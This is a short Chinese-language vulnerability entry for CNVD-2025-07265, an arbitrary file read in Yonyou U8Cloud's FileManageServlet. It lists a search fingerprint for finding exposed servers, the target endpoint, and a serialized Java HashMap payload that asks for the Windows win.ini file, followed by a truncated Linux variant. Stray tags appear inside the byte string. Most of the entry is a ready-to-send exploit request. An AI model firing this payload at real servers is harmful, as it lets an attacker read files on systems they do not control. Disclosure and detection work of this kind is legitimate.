# 用友U8CloudFileManageServlet存在任意文件读取(CNVD-2025-07265)

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="U8C"`
- **请求**：`POST /service/FileManageServlet HTTP/1.1`
- **关键头**：`Content-Type: application/octet-stream`

**请求体 / payload**
```
{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16<code>\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x12C:\\Windows\\win.init\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx")}}
Linux
POST /service/FileManageServlet HTTP/1.1
Host:
Content-Type: application/octet-stream
{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16</code>\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\…（脚本共 715 字，完整版见原文）
```
- **预期**：200　|　—